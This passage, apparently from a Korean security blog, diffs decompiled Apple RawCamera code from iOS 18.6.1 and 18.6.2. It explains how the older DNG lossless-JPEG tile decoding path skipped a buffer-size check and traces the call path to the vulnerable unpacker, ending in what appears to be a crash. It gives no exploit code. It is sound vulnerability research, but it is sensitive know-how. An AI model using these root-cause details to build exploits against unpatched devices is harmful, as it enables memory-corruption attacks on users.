class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(_QWORD *))(*a1 + <span class="hljs-number">40L</span>L))(a1));          }          <span class="hljs-keyword">else</span>          {            v42 += <span class="hljs-number">3</span>;          }          v41 += <span class="hljs-number">4</span>;          --a5;        }        <span class="hljs-keyword">while</span> ( a5 );      }      v35 = v61 + <span class="hljs-number">1</span>;      v62 += BytesPerRow_11;      a5 = v59;    }    <span class="hljs-keyword">while</span> ( v61 + <span class="hljs-number">1</span> != a6 );  }  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v24)</span></span>;  <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(v22)</span></span>;  objc_release(v57);  objc_release(v17);  <span class="hljs-keyword">if</span> ( v58 )    CFRelease_60(v58);  <span class="hljs-keyword">if</span> ( v73 )    CFRelease_60(v73);  <span class="hljs-keyword">if</span> ( v72 )    CFRelease_60(v72);  CVPixelBufferUnlockBaseAddress_11(v71, <span class="hljs-number">0L</span>L);  <span class="hljs-keyword">if</span> ( v71 )    CFRelease_60(v71);}</code></pre><p>&#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB2C8; &#xD06C;&#xAC8C; 3&#xAC00;&#xC9C0; &#xC815;&#xB3C4;&#xAC00; &#xBCC0;&#xACBD;&#xB41C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ol><li><p><strong>CGImage* &#x2192; CMPhoto + CVPixelBuffer</strong></p><p> <strong>G90 (18.6.1)</strong></p><ul><li><p>CGImageSourceCreateWithData &#x2192; CGImageSourceCreateImageAtIndex&#xB85C; CGImage&#xB97C; &#xB9CC;&#xB4E0; &#xB4A4;</p><p>  CGImageGetDataProvider &#x2192; CGDataProviderCopyData&#xB85C; <strong>&#xD3C9;&#xBA74; &#xBC14;&#xC774;&#xD2B8; &#xBC84;&#xD37C;(CFData)</strong>&#xB97C; &#xC9C1;&#xC811; &#xC5BB;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xD3ED;&#xB7;&#xB192;&#xC774;&#xC640; CFDataGetLength() == 4<em>w</em>h&#xB9CC; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xBC14;&#xC774;&#xD2B8; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC21C;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>G100 (18.6.2)</strong></p></li><li><p>&#xC0C8;&#xB85C;&#xC6B4; <strong>CMPhoto</strong> &#xB514;&#xCF54;&#xB529; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>CMPhotoDecompressionSessionCreate</li><li>CMPhotoDecompressionSessionCreateContainer (&#xCEE8;&#xD14C;&#xC774;&#xB108; &#xC635;&#xC158;&#xC5D0; <strong>JFIF</strong> &#xC9C0;&#xC815;)</li><li>CMPhotoDecompressionContainerCreateImageForIndex &#x2192; <strong>CVPixelBuffer</strong> &#xD68D;&#xB4DD;</li></ul></li><li>&#xC774;&#xD6C4; CVPixelBufferLockBaseAddress / GetBaseAddress&#xB85C; <strong>&#xD53D;&#xC140; &#xBC84;&#xD37C;&#xB97C; &#xC7A0;&#xADF8;&#xACE0; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC811;&#xADFC;</strong>&#xD569;&#xB2C8;&#xB2E4;.</li><li>__stack_chk_guard&#xB3C4; &#xCD94;&#xAC00;</li></ul></li><li><p><strong>&#xBC84;&#xD37C; &#xD06C;&#xAE30; &#xAC80;&#xC99D; &#xCD94;&#xAC00;</strong></p><p> <strong>G90 (18.6.1)</strong></p> <pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre><ul><li>&#xB2E8;&#xC21C;&#xD788; 4<em>w</em>h&#xC640; CFData &#xAE38;&#xC774;&#xB9CC; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</li><li><p>bytesPerRow&#xB098; &#xCD9C;&#xB825; &#xD3EC;&#xB9F7; &#xBCC0;&#xD654;&#xC5D0; &#xB530;&#xB978; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30; &#xBCC0;&#xB3D9;&#xC744; &#xBC18;&#xC601;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>G100 (18.6.2)</strong></p><pre><code class="hljs cpp">BytesPerRow = CVPixelBufferGetBytesPerRow(buf);DataSize    = CVPixelBufferGetDataSize(buf);<span class="hljs-comment">// expected = f(width, height)  // sub_1DD8A8C14</span><span class="hljs-comment">// bpp = 4                       // v68=4 &#x2192; sub_1DD8A8C7C</span><span class="hljs-keyword">if</span> (DataSize != expected) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre></li><li><p><strong>&#xC2E4;&#xC81C; &#xD53D;&#xC140;&#xBC84;&#xD37C;&#xC758; &#xCD1D; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;</strong>(CVPixelBufferGetDataSize)&#xC640;, &#xB0B4;&#xBD80; &#xD5EC;&#xD37C;(sub_1DD8A8C14/7C)&#xAC00; &#xACC4;&#xC0B0;&#xD55C; <strong>&#xAE30;&#xB300;&#xCE58;</strong>&#xB97C; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li>&#xAE30;&#xB300;&#xCE58;&#xB294; width/height/bpp(=4)&#xBFD0; &#xC544;&#xB2C8;&#xB77C; <strong>stride(&#xD589;&#xBCC4; &#xBC14;&#xC774;&#xD2B8; &#xC218;)</strong> &#xAC19;&#xC740; &#xD604;&#xC2E4; &#xC694;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; &#xD615;&#xD0DC;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;.</li><li><p>&#xBD88;&#xC77C;&#xCE58; &#xC2DC; &#xC989;&#xC2DC; &#xC608;&#xC678;&#xB97C; &#xB358;&#xC838; &#xD6C4;&#xC18D; &#xC4F0;&#xAE30; &#xACBD;&#xB85C; &#xC9C4;&#xC785;&#xC744; &#xB9C9;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#x2192; CFData&#xC758; &#xCD94;&#xC0C1;&#xC801; &#xAE38;&#xC774; &#xBE44;&#xAD50; &#x2192; CVPixelBuffer&#xC758; &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC; &#xBC30;&#xCE58; &#xAE30;&#xBC18; &#xBE44;&#xAD50;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p></li></ul></li><li><p><strong>&#xD53D;&#xC140; &#xD3EC;&#xB9F7;/&#xCC44;&#xB110; &#xC811;&#xADFC; &#xC21C;&#xC11C;</strong></p><p> <strong>G90 (18.6.1)</strong></p><ul><li>BytePtr&#xC5D0;&#xC11C; <strong>R, G, B</strong> &#xC21C;&#xC73C;&#xB85C; &#xC77D;&#xACE0;(LUT &#xC624;&#xD504;&#xC14B; +156 / +412 / +668), 16-bit&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xC5EC; dst += 3 &#xD615;&#xD0DC;&#xB85C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</li><li><p>&#xD589; &#xC774;&#xB3D9;&#xC740; BytesPerRow * y&#xB97C; &#xB354;&#xD574; &#xCC98;&#xB9AC;</p><p><strong>G100 (18.6.2)</strong></p></li><li><p>CVPixelBufferGetBaseAddress()&#xB85C; &#xAE30;&#xBC18; &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC740; &#xB4A4;, <strong>base + 2&#xC5D0;&#xC11C; &#xC2DC;&#xC791;</strong>&#xD574; B &#x2192; G &#x2192; R &#xC21C;&#xC73C;&#xB85C; &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>v41(=base+2) &#x2192; <strong>B</strong> &#x2192; LUT(+668)</li><li>(v41-1)(=base+1) &#x2192; <strong>G</strong> &#x2192; LUT(+412)</li><li>(v41-2)(=base+0) &#x2192; <strong>R</strong> &#x2192; LUT(+156)</li><li>&#xC774;&#xD6C4; v41 += 4 (&#xB2E4;&#xC74C; &#xD53D;&#xC140;)</li></ul><p>&#x2192; &#xC785;&#xB825; &#xD3EC;&#xB9F7;&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; BGRA/ RGBA &#xACC4;&#xC5F4;&#xB85C; &#xAC04;&#xC8FC;&#xD558;&#xACE0; &#xCC44;&#xB110; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACE0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. </p></li></ul></li></ol><p>&#xBCC0;&#xACBD; &#xC810;&#xC774; &#xC788;&#xB358; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xC9C0; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC694;&#xC57D;&#xD558;&#xC790;&#xBA74;, G90(18.6.1)&#xC740; CGImage &#xACBD;&#xB85C;&#xB85C; &#xB514;&#xCF54;&#xB529;&#xD55C; &#xB4A4; CFData&#xB97C; &#xC9C1;&#xC811; &#xC21C;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB54C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC0AC;&#xC2E4;&#xC0C1; &#x2018;&#xD3ED;&#xACFC; &#xB192;&#xC774;&#xC758; &#xC77C;&#xCE58;&#x2019; &#xC640; &#x2018;CFDataGetLength() == 4 &#xD7; W &#xD7; H&#x2018; &#xC774;&#xB807;&#xAC8C; &#xB450; &#xAC00;&#xC9C0; &#xBFD0;&#xC774;&#xC5C8;&#xACE0;, &#xC2E4;&#xC81C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xD589; &#xB2E8;&#xC704; &#xC624;&#xD504;&#xC14B;(<code>BytesPerRow</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xC774;&#xBBF8;&#xC9C0;(&#xC0C9;&#xACF5;&#xAC04;&#xB7;&#xC11C;&#xBE0C;&#xC0D8;&#xD50C;&#xB9C1;&#xB7;&#xD589; &#xD328;&#xB529; &#xB4F1;) <strong>&#xAC80;&#xC99D;&#xC740; &#xD1B5;&#xACFC;&#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C; &#xC811;&#xADFC;&#xC740; CFData &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB0A0; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</strong> </p><p>&#xC774;&#xB7EC;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xD328;&#xCE58;&#xD55C; G100(18.6.2)&#xC5D0;&#xC11C;&#xB294; &#xB514;&#xCF54;&#xB529;&#xC744; CMPhoto(+ JFIF &#xD55C;&#xC815;) &#x2192; CVPixelBuffer&#xB85C; &#xC804;&#xD658;&#xD558;&#xC600;&#xACE0;, &#xC2E4;&#xC81C; &#xBC84;&#xD37C; &#xCD1D; &#xBC14;&#xC774;&#xD2B8; &#xC218;(<code>CVPixelBufferGetDataSize</code>)&#xB97C; &#xB0B4;&#xBD80; &#xD5EC;&#xD37C;&#xAC00; &#xACC4;&#xC0B0;&#xD55C; &#xAE30;&#xB300; &#xD06C;&#xAE30;(&#xD3ED;&#xB7;&#xB192;&#xC774; &#xB4F1;)&#xC640; &#xBE44;&#xAD50;&#xD569;&#xB2C8;&#xB2E4;. </p><hr><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>(G90 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.)</p><p>&#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xC911;&#xC5D0; <code>sub_1DD8A7684</code> &#xAC00; vtable&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>C++ &#xAC1D;&#xCCB4;&#xB294; &#xCCAB; &#xD544;&#xB4DC;&#xAC00; &#xBCF4;&#xD1B5; vptr(vtable &#xD3EC;&#xC778;&#xD130;)&#xC774;&#xACE0;, &#xAC00;&#xC0C1;&#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; this-&gt;vptr[slot]&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370; RawCamera &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; strip &#xB418;&#xC5B4; &#xC2EC;&#xBCFC;&#xC774; &#xC9C0;&#xC6CC;&#xC838;&#xC788;&#xC5B4;&#xC11C; &#xC8FC;&#xC18C;&#xAC12;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xAE30;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xAC00; &#xC27D;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp">[ex](*(*<span class="hljs-keyword">this</span>)+<span class="hljs-number">0xE0</span>)(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><pre><code class="hljs cpp">[ex]<span class="hljs-keyword">this</span>-&gt;vptr-&gt;unpack_lossless(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>&#xADF8;&#xB798;&#xC11C; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB514;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C;, &#xC5B4;&#xB5A4; &#xC778;&#xC790;&#xB97C; &#xAC00;&#xC9C0;&#xB294; &#xC9C0; &#xB4F1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC704;&#xCC98;&#xB7FC; vtable&#xC744; &#xAD6C;&#xC870;&#xCCB4;&#xD654;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xBA3C;&#xC800; &#xC9C4;&#xD589;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.  </p><p>IDAPython&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>vtable &#xD30C;&#xC2F1; &#xD6C4; &#xAD6C;&#xC870;&#xCCB4;&#xD654;</li><li>&#xBAA8;&#xB4E0; &#xAC00;&#xC0C1; &#xD568;&#xC218;&#xC5D0; &#xCCAB; &#xC778;&#xC790; <code>struct CDNGLosslessJpegUnpacker *this</code> &#xC801;&#xC6A9; (this&#xB97C; &#xD074;&#xB798;&#xC2A4; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xD0C0;&#xC785;&#xD654;)</li></ol><p>&#xC774;&#xB807;&#xAC8C; &#xC801;&#xC6A9;&#xD558;&#xBA74; <code>(*(*this)+0xE0)(this)</code> &#xAC00; <code>this-&gt;vptr-&gt;fn_028(this, &#x2026;)</code> &#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; &#xBCF4;&#xC774;&#xACE0;, &#xD544;&#xB4DC; &#xC811;&#xADFC;&#xB3C4; <code>this-&gt;field_d8</code>&#xCC98;&#xB7FC; &#xBA85;&#xC2DC;&#xB418;&#xC5B4; &#xC2AC;&#xB86F; &#xB9E4;&#xD551;&#xACFC; &#xCD94;&#xC801;&#xC774; &#xC26C;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB514;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC9C0; &#xCF5C;&#xD2B8;&#xB9AC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/23/clalxk/imageIO_ko/image14.png" alt="image.png"></p><p>&#xBA3C;&#xC800; Lossless&#xB97C; &#xD544;&#xD130;&#xB9C1; &#xAC78;&#xC5B4;, &#xCDE8;&#xC57D;&#xD558;&#xB2E4;&#xACE0; &#xACF5;&#xAC1C;&#xB41C; <code>CDNGLosslessJpegUnpacker</code> &#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBA74; <code>sub_1DD95DE88</code> &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC0C1;&#xC138; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD95DE88</span><span class="hljs-params">(<span class="hljs-keyword">os_signpost_id_t</span> a1, __int64 a2, __int64 a3, __int64 a4)</span></span><span class="hljs-function"></span>{  .  .  .    <span class="hljs-keyword">if</span> ( *(_DWORD *)(a1 + <span class="hljs-number">216</span>)    || (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(<span class="hljs-keyword">os_signpost_id_t</span>))(*(_QWORD *)a1 + <span class="hljs-number">224L</span>L))(a1) == <span class="hljs-number">2</span>    || (v12 = *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>), v12 == <span class="hljs-number">4</span>) )  {    sub_1DD9009D4(a1, a2, a3, a4);  }  <span class="hljs-keyword">else</span>  {    v14 = *(_DWORD *)(a1 + <span class="hljs-number">44</span>);    v13 = *(_DWORD *)(a1 + <span class="hljs-number">48</span>);    v15 = *(_DWORD *)(a1 + <span class="hljs-number">224</span>);    v16 = *(_DWORD *)(a1 + <span class="hljs-number">228</span>);    *(_QWORD *)&amp;v35 = v12 &gt;&gt; <span class="hljs-number">2</span>;    sub_1DD8731E0(&amp;v36, &amp;v35);    <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>) != *(_QWORD *)(a1 + <span class="hljs-number">264</span>) - *(_QWORD *)(a1 + <span class="hljs-number">256</span>)      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v14 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v13 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || v15 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || v16 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || (v28 = v11, v17 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v36, v36 &gt;= <span class="hljs-number">20000</span>) )    {      exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(exception_15, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    v29 = a4;    <span class="hljs-keyword">if</span> ( (((v13 + v16 - <span class="hljs-number">1</span>) / v16) &gt;&gt; (*(_DWORD *)(a1 + <span class="hljs-number">216</span>) != <span class="hljs-number">0</span>)) * ((v14 + v15 - <span class="hljs-number">1</span>) / v15) != v36 )    {      v27 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v27, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(v27, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    group = dispatch_group_create();    v30 = dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, MEMORY[<span class="hljs-number">0x1E6FA52F0</span>]);</code></pre><p><code>sub_1DD95DE88</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; 3&#xAC00;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. </p><ul><li><p>[this+0xD8] != 0</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF30</span>  LDR   W8, [X23,#<span class="hljs-number">0xD8</span>]<span class="hljs-number">0x1DD95DF34</span>  CBNZ  W8, loc_1DD95DF78</code></pre><p>  &#x2192; 0&#xC774; &#xC544;&#xB2C8;&#xBA74; &#xBC14;&#xB85C; <code>loc_1DD95DF78</code> &#xACBD;&#xB85C;&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;.</p></li><li><p>vtable &#xC624;&#xD504;&#xC14B; 0xE0(&#xC2AC;&#xB86F; &#xC778;&#xB371;&#xC2A4; 28) &#xD638;&#xCD9C; &#xACB0;&#xACFC;&#xAC00; 2&#xC778;&#xC9C0; &#xBE44;&#xAD50;</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF38</span>  LDR   X16, [X23]           ; vtable = [<span class="hljs-keyword">this</span>]<span class="hljs-number">0x1DD95DF44</span>  AUTDA X16, X17             ; (PAC &#xD574;&#xC81C;)<span class="hljs-number">0x1DD95DF48</span>  LDR   X8,  [X16,#<span class="hljs-number">0xE0</span>]!    ; fn = vtable[<span class="hljs-number">0xE0</span>/<span class="hljs-number">8</span>] &#x2190; &#xC2AC;&#xB86F; <span class="hljs-number">28</span><span class="hljs-number">0x1DD95DF50</span>  MOV   X0,  X23             ; <span class="hljs-keyword">this</span><span class="hljs-number">0x1DD95DF5C</span>  BLRAA X8, X17              ; &#xAC04;&#xC811; &#xD638;&#xCD9C;<span class="hljs-number">0x1DD95DF60</span>  CMP   W0,  #<span class="hljs-number">2</span>              ; &#xBC18;&#xD658;&#xAC12; == <span class="hljs-number">2</span> ?<span class="hljs-number">0x1DD95DF64</span>  B.EQ  loc_1DD95DF78</code></pre><p>  &#x2192; &#xBC18;&#xD658;&#xAC12;&#xC774; 2&#xBA74; <code>loc_1DD95DF78</code>&#xB85C; &#xBD84;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>([this+0xF0] - [this+0xE8]) == 4 &#xCCB4;&#xD06C;</p>  <pre><code class="hljs cpp"><span class="hljs-number">0x1DD95DF68</span>  LDP   X9, X8, [X23,#<span class="hljs-number">0xE8</span>]  ; X9=[E8], X8=[F0]<span class="hljs-number">0x1DD95DF6C</span>  SUB   X8, X8, X9           ; (F0 - E8)<span class="hljs-number">0x1DD95DF70</span>  CMP   X8, #<span class="hljs-number">4</span><span class="hljs-number">0x1DD95DF74</span>  B.NE  loc_1DD95E008</code></pre><p>  &#x2192; &#xCC28;&#xC774;&#xAC00; 4&#xAC00; &#xC544;&#xB2C8;&#xBA74; loc_1DD95E008 &#xACBD;&#xB85C;&#xB85C; &#xBE60;&#xC9C0;&#xACE0;, 4&#xC774;&#xBA74; &#xC704;&#xC758; &#xBD84;&#xAE30;&#xB4E4;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xD1B5;&#xACFC;&#xD558;&#xC5EC; loc_1DD95DF78 &#xACBD;&#xB85C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p></li></ul><pre><code class="hljs angelscript"><span class="hljs-comment">// sub_1DD95DE88</span><span class="hljs-keyword">if</span> ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xD8</span>] != <span class="hljs-number">0</span>               <span class="hljs-comment">// 0xD8 &#xD50C;&#xB798;&#xADF8;</span> || vtable[<span class="hljs-number">28</span>](<span class="hljs-keyword">this</span>) == <span class="hljs-number">2</span>          <span class="hljs-comment">// &#xC2AC;&#xB86F; 28 &#xD638;&#xCD9C; &#xBC18;&#xD658;&#xAC12;</span> || ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xF0</span>]-[<span class="hljs-keyword">this</span>+<span class="hljs-number">0xE8</span>]) == <span class="hljs-number">4</span> <span class="hljs-comment">// &#xAE38;&#xC774;/&#xC624;&#xD504;&#xC14B; &#xC77C;&#xCE58;</span>) {    <span class="hljs-comment">// &#xD0C0;&#xC77C; &#xD050; &#xC548; &#xD0D0; (&#xCDE8;&#xC57D; &#xACBD;&#xB85C; &#xC544;&#xB2D8;)</span>    sub_1DD9009D4(...);} <span class="hljs-keyword">else</span> {    <span class="hljs-comment">// &#xD0C0;&#xC77C; &#xD050; &#xACBD;&#xB85C; &#x2192; &#xCDE8;&#xC57D; &#xACBD;&#xB85C;&#xB85C; &#xC9C4;&#xC785; &#xAC00;&#xB2A5;</span>    dispatch_group_create();    dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, ...);    <span class="hljs-comment">// &#xAC01; &#xD0C0;&#xC77C; &#xC791;&#xC5C5; &#xBE14;&#xB85D; &#xB0B4;&#xBD80;:</span>    sub_1DD95E410 &#x2192; sub_1DD95DCD8 &#x2192; (HW) sub_1DD95E4A4 &#xB610;&#xB294; (SW) sub_1DD95B198    <span class="hljs-comment">// &#xCD5C;&#xC885; &#xD53D;&#xC140; &#xBCC0;&#xD658;:</span>    &#x2264;<span class="hljs-number">8</span>bpp: sub_1DD95EF54 &#x2192; LUT &#xAC8C;&#xC774;&#xD2B8; sub_1DDA4EF58    &#x2265;<span class="hljs-number">9</span>bpp: sub_1DD95EA64 &#x2192; LUT &#xAC8C;&#xC774;&#xD2B8; sub_1DDA4EF58}</code></pre><p>&#xC774; &#xC870;&#xAC74;&#xC774; &#xC131;&#xB9BD;&#xD558;&#xB294; &#xBD84;&#xAE30;&#xC5D0;&#xC11C; &#x201C;Lossless DNG Tile Unpacker Queue&#x201D;&#xB77C;&#xB294; &#xD0C0;&#xC77C; &#xB2E8;&#xC704; &#xD574;&#xC81C; &#xD050;&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xACE0;, &#xADF8; &#xD558;&#xC704; &#xACBD;&#xB85C;&#xAC00; &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><hr><p>&#xC774;&#xB54C; &#xD0C0;&#xC77C; &#xD050;&#xB294; &#xD55C; &#xC7A5;&#xC9DC;&#xB9AC; &#xD070; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; TileWidth &#xD7; TileLength &#xD06C;&#xAE30;&#xC758; &#xC791;&#xC740; &#xC870;&#xAC01;&#xC73C;&#xB85C; &#xCABC;&#xAC1C;&#xC11C;, &#xD0C0;&#xC77C;&#xBCC4;&#xB85C; &#xB514;&#xCF54;&#xB4DC; &#x2192; &#xC0C9;&#xBCF4;&#xC815; &#x2192; &#xCD9C;&#xB825; &#xBC84;&#xD37C; &#xBC30;&#xCE58; &#xB4F1;&#xC758; &#xACFC;&#xC815;&#xC744; &#xC218;&#xD589;&#xD55C;&#xB2E4;&#xACE0; &#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs c"><span class="hljs-number">0x1DD95DE88</span>    <span class="hljs-number">0x1DD95E410</span>        <span class="hljs-number">0x1DD95DCD8</span>            <span class="hljs-number">0x1DD95E4A4</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95B198</span>                <span class="hljs-number">0x1DD95EF54</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95EA64</span>                    <span class="hljs-number">0x1DDA4EF58</span></code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xCF5C;&#xD2B8;&#xB9AC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC774; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><hr><p><img src="/2025/10/23/clalxk/imageIO_ko/image15.png" alt="image.png"></p><p>Boom..</p><p>&#xC0C8;&#xB85C;&#xC6B4; 